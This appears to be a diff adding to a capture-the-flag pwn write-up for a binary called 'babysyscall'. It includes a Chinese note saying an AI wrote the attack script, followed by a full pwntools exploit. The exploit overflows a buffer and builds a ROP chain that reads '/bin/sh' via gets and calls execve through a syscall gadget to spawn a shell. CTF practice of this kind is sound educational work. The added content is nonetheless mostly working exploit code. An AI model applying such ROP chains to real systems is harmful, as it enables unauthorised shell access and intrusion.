@@ -88,3 +88,42 @@ print(payload)
 p.send(payload)
 p.interactive()
 ```
+
+AI 完成的攻击脚本，没有用 mov dword ptr 的 gadget，而是用 gets 来读取 /bin/sh 的字符串：
+
+```python
+from pwn import *
+
+context.arch = 'amd64'
+context.os = 'linux'
+
+elf = ELF('./babysyscall')
+
+import sys
+LOCAL = '--remote' not in sys.argv
+
+if LOCAL:
+    p = process('./babysyscall')
+else:
+    p = remote('localhost', 9999)
+
+pop_rdi = 0x401e8f
+pop_rsi = 0x409efe
+pop_rax = 0x447ee7
+pop_rdx_rbx = 0x47f06b
+syscall = 0x449af9
+gets = 0x40c1d0
+bss = 0x4c8000
+
+payload = b'A' * 32 + b'B' * 8
+payload += p64(pop_rdi) + p64(bss) + p64(gets)
+payload += p64(pop_rdi) + p64(bss)
+payload += p64(pop_rsi) + p64(0)
+payload += p64(pop_rdx_rbx) + p64(0) + p64(0)
+payload += p64(pop_rax) + p64(59) + p64(syscall)
+
+p.sendline(payload)
+import time; time.sleep(0.3)
+p.sendline(b'/bin/sh')
+p.interactive()
+```
